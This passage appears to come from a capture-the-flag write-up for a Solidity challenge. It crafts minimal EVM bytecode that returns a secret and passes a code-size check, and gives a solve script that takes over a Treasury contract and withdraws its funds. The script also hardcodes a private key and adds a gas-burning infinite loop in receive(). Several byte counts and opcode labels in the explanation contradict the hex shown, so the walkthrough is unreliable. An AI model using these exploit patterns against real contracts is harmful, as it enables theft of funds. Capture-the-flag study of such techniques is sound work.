+</span><span style=color:#0086b3>bytes32</span><span> secret </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>bytes32</span><span>(</span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodePacked</span><span>(</span><span style=color:#183691>"I'm_L0yal;)"</span><span>)) </span><span style=color:#a71d5d;font-weight:700>>> </span><span>(</span><span style=color:#0086b3>24 </span><span style=color:#a71d5d;font-weight:700>*</span><span> 7);  </span><span style=color:#969896;font-style:italic>// Required secret
+</span></code></pre><ol start=2><li><strong>Breaking Down the Secret</strong>:</ol><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// Original string: "I'm_L0yal;)"
+</span><span style=color:#969896;font-style:italic>// Length: 10 bytes
+</span><span style=color:#969896;font-style:italic>// After right shift by 24*7 bits:
+</span><span style=color:#969896;font-style:italic>// 0x00000000000000000000000000000000000000000049276d5f4c3079616c3b29
+</span></code></pre><ol start=3><li><strong>Writing the Contract in Bytecode</strong>:</ol><p>First, let's write the initialization code:<pre style=color:#323232;background-color:#fff><code><span>60 14       // PUSH1 0x14 (20 bytes)
+</span><span>60 0c       // PUSH1 0x0c (12 bytes)
+</span><span>60 00       // PUSH1 0x00
+</span><span>39          // CODESIZE
+</span><span>60 14       // PUSH1 0x14
+</span><span>60 00       // PUSH1 0x00
+</span><span>f3          // RETURN
+</span></code></pre><p>This ensures our contract is exactly 20 bytes.<p>Now, let's write the runtime code:<pre style=color:#323232;background-color:#fff><code><span>6a          // PUSH10 (push 10 bytes)
+</span><span>49 27 6d 5f 4c 30 79 61 6c 3b 29  // "I'm_L0yal;)" (the secret)
+</span><span>60 00       // PUSH1 0x00 (memory offset)
+</span><span>52          // MSTORE (store in memory)
+</span><span>60 20       // PUSH1 0x20 (32 bytes)
+</span><span>60 00       // PUSH1 0x00 (memory offset)
+</span><span>f3          // RETURN (return the secret)
+</span></code></pre><ol start=4><li><strong>Combining the Bytecode</strong>:</ol><pre style=color:#323232;background-color:#fff><code><span>// Initialization code (12 bytes)
+</span><span>6014600c60003960146000f3
+</span><span>
+</span><span>// Runtime code (8 bytes)
+</span><span>6a49276d5f4c3079616c3b2960005260206000f3
+</span><span>
+</span><span>// Combined (20 bytes)
+</span><span>6014600c60003960146000f36a49276d5f4c3079616c3b2960005260206000f3
+</span></code></pre><ol start=5><li><strong>How it Works</strong>:</ol><ul><li>When deployed: <ol><li>Initialization code runs first<li>Returns exactly 20 bytes of code<li>Runtime code is what remains after deployment</ol><li>When <code>spillSecret()</code> is called: <ol><li>Runtime code executes<li>Pushes "I'm_L0yal;)" onto stack<li>Stores it in memory<li>Returns it as the secret</ol></ul><ol start=6><li><strong>Verifying the Size</strong>:</ol><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// In SecretChecker.sol
+</span><span style=color:#0086b3>uint256</span><span> length;
+</span><span style=color:#a71d5d;font-weight:700>assembly </span><span>{
+</span><span>    length </span><span style=color:#a71d5d;font-weight:700>:= </span><span style=color:#62a35c>extcodesize</span><span>(_servant)
+</span><span>}
+</span><span>require(length &lt;= 20, "HaHa! try again xD");
+</span></code></pre><p>Our contract is exactly 20 bytes, satisfying this check.<ol start=7><li><strong>Verifying the Secret</strong>:</ol><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// In SecretChecker.sol
+</span><span style=color:#0086b3>bytes32</span><span> encodedSecret </span><span style=color:#a71d5d;font-weight:700>=</span><span> servant.</span><span style=color:#62a35c>spillSecret</span><span>();
+</span><span style=color:#0086b3>bytes32</span><span> secret </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>bytes32</span><span>(</span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodePacked</span><span>(</span><span style=color:#183691>"I'm_L0yal;)"</span><span>)) </span><span style=color:#a71d5d;font-weight:700>>> </span><span>(</span><span style=color:#0086b3>24 </span><span style=color:#a71d5d;font-weight:700>*</span><span> 7);
+</span><span>require(</span><span style=color:#a71d5d;font-weight:700>keccak256</span><span>(</span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodePacked</span><span>(secret)) </span><span style=color:#a71d5d;font-weight:700>== keccak256</span><span>(</span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodePacked</span><span>(encodedSecret)));
+</span></code></pre><p>Our contract returns "I'm_L0yal;)" which, when shifted right by 24*7 bits, matches the required secret.<h3 id=solution-script>Solution Script</h3><div class=note-container><button class=note-toggle><div class=note-icon><p>SolveScript.s.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>SolveScript </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>Script </span><span>{
+</span><span>    Setup </span><span style=color:#a71d5d;font-weight:700>public </span><span>set </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Setup</span><span>(</span><span style=color:#0086b3>payable</span><span>(</span><span style=color:#0086b3>0x5a825D1C0B1cE08dAd551a73a180785598FD22eE</span><span>));
+</span><span>    SecretChecker </span><span style=color:#a71d5d;font-weight:700>public </span><span>secretChecker;
+</span><span>    Treasury </span><span style=color:#a71d5d;font-weight:700>public </span><span>treasury;
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setUp</span><span>() </span><span style=color:#a71d5d;font-weight:700>public </span><span>{}
+</span><span>
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
+</span><span>        vm.</span><span style=color:#62a35c>startBroadcast</span><span>(</span><span style=color:#0086b3>0x0abccce2d992649ac814a88542efa920523c780b101babc97ff79651a4652ff1</span><span>);
+</span><span>        secretChecker </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>secretChecker</span><span>();
+</span><span>        treasury </span><span style=color:#a71d5d;font-weight:700>=</span><span> set.</span><span style=color:#62a35c>treasury</span><span>();
+</span><span>        AttackDeployer attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>AttackDeployer</span><span>();
+</span><span>        </span><span style=color:#0086b3>address</span><span> servant </span><span style=color:#a71d5d;font-weight:700>=</span><span> attack.</span><span style=color:#62a35c>exploit</span><span>();
+</span><span>        treasury.</span><span style=color:#62a35c>BecomeServant</span><span>(</span><span style=color:#0086b3>address</span><span>(attack));
+</span><span>        treasury.</span><span style=color:#62a35c>withdraw</span><span>();
+</span><span>
+</span><span>        secretChecker.</span><span style=color:#62a35c>IKnowTheSecret</span><span>(servant);
+</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"SecretIsLeaked : "</span><span>, secretChecker.</span><span style=color:#62a35c>SecretIsLeaked</span><span>());
+</span><span>
+</span><span>        vm.</span><span style=color:#62a35c>stopBroadcast</span><span>();
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>AttackDeployer </span><span>{
+</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#a71d5d;font-weight:700>public returns </span><span>(</span><span style=color:#0086b3>address</span><span>) {
+</span><span>         </span><span style=color:#969896;font-style:italic>//    bytes32 secret = bytes32(abi.encodePacked("I'm_L0yal;)")) >> (24 * 7); //0x00000000000000000000000000000000000000000049276d5f4c3079616c3b29
+</span><span>    </span><span style=color:#969896;font-style:italic>//    console.logBytes32(secret);
+</span><span>    </span><span style=color:#969896;font-style:italic>// RUNTIME : 6a49276d5f4c3079616c3b2960005260206000f3  // 6a49276d5f4c3079616c3b29600052600b6015f3
+</span><span>    </span><span style=color:#969896;font-style:italic>// INIT: 6014600c60003960146000f3 6a49276d5f4c3079616c3b2960005260206000f3
+</span><span>        </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>memory</span><span> bytecode </span><span style=color:#a71d5d;font-weight:700>= </span><span>hex</span><span style=color:#183691>"6014600c60003960146000f36a49276d5f4c3079616c3b2960005260206000f3"</span><span>;
+</span><span>        </span><span style=color:#0086b3>address</span><span> _solver;
+</span><span>        </span><span style=color:#0086b3>uint256</span><span> _size;
+</span><span>        
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>assembly </span><span>{
+</span><span>            _solver </span><span style=color:#a71d5d;font-weight:700>:= </span><span style=color:#62a35c>create</span><span>(0, </span><span style=color:#62a35c>add</span><span>(bytecode, </span><span style=color:#0086b3>0x20</span><span>), </span><span style=color:#62a35c>mload</span><span>(bytecode))
+</span><span>            _size </span><span style=color:#a71d5d;font-weight:700>:= </span><span style=color:#62a35c>extcodesize</span><span>(_solver)
+</span><span>        }
+</span><span>        require(_solver != address(0));
+</span><span>        console.log("Code size : ", _size);
+</span><span>        return _solver;
+</span><span>    }
+</span><span>    
+</span><span>    </span><span style=color:#62a35c>receive</span><span>() external payable {
+</span><span>        </span><span style=color:#0086b3>uint256</span><span> a </span><span style=color:#a71d5d;font-weight:700>=</span><span> 2;
+</span><span>        </span><span style=color:#a71d5d;font-weight:700>while </span><span>(</span><span style=color:#0086b3>true</span><span>) {
+</span><span>            a </span><span style=color:#a71d5d;font-weight:700>=</span><span> a </span><span style=color:#a71d5d;font-weight:700>*</span><span> a;
+</span><span>        }   
+</span><span>    }
+</span><span>}
+</span></code></pre></div></div><p>The flag <code>r3venge_t4k3n_5ucc3s5fu11y!;)</code> is well deserved for this clever exploit that combines multiple concepts in smart contract security!<hr><p>Thanks to making it this far!</section></article></main></div>
